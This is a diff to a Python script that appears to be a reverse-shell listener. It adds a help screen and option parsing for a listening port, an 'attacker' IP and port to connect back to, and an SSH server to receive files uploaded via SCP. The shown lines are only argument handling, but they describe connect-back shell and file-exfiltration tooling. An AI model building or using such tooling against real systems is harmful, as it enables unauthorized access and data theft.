@@ -7,13 +7,28 @@ import socket
 import threading
 import os
 import sys
+from datetime import datetime
 from getpass import getpass
-from time import sleep
 
-port = 8008 if len(sys.argv) == 1 else int(sys.argv[1])
+if "-h" in sys.argv or "--help" in sys.argv:
+    print(os.path.split(sys.argv[0])[-1])
+    print("Copyright " + str(datetime.now().year) + " Ashish D'Souza. All rights reserved.\n")
+    print("Usage: " + os.path.split(sys.argv[0])[-1] + " [options]\n")
+    print("Option\t\tLong Option\t\tDescription")
+    print("-h\t\t--help\t\t\tShow this help screen")
+    print("-p [port]\t\t--port [port]\t\tUse specified port")
+    print("-i [ip:port]\t--ip [ip:port]\t\tIP address and port to connect back to")
+    print("-s [ip:port]\t--ssh [ip:port]\t\tIP address and port to upload files to via SCP (SSH Server)")
+
 timeout = False
-
 stop = False
+
+if "-p" in sys.argv:
+    port = sys.argv[sys.argv.index("-p") + 1]
+elif "--port" in sys.argv:
+    port = sys.argv[sys.argv.index("--port") + 1]
+else:
+    port = 8008
 
 
 def recv(conn):
@@ -22,11 +37,22 @@ def recv(conn):
     print()
 
 
-if "-ip" in sys.argv:
-    attacker_ip = sys.argv[sys.argv.index("-ip") + 1].split(":")[0]
-    attacker_port = sys.argv[sys.argv.index("-ip") + 1].split(":")[1]
-    if "-ssh" in sys.argv:
-        ssh_address = sys.argv[sys.argv.index("-ssh") + 1]
+if "-i" in sys.argv:
+    attacker_ip = sys.argv[sys.argv.index("-i") + 1].split(":")[0]
+    attacker_port = sys.argv[sys.argv.index("-i") + 1].split(":")[1]
+    if "-s" in sys.argv:
+        ssh_address = sys.argv[sys.argv.index("-s") + 1]
+    elif "--ssh" in sys.argv:
+        ssh_address = sys.argv[sys.argv.index("--ssh") + 1]
+    else:
+        ssh_address = input("SSH Server Address >> ")
+elif "--ip" in sys.argv:
+    attacker_ip = sys.argv[sys.argv.index("--ip") + 1].split(":")[0]
+    attacker_port = sys.argv[sys.argv.index("--ip") + 1].split(":")[1]
+    if "-s" in sys.argv:
+        ssh_address = sys.argv[sys.argv.index("-s") + 1]
+    elif "--ssh" in sys.argv:
+        ssh_address = sys.argv[sys.argv.index("--ssh") + 1]
     else:
         ssh_address = input("SSH Server Address >> ")
 else:
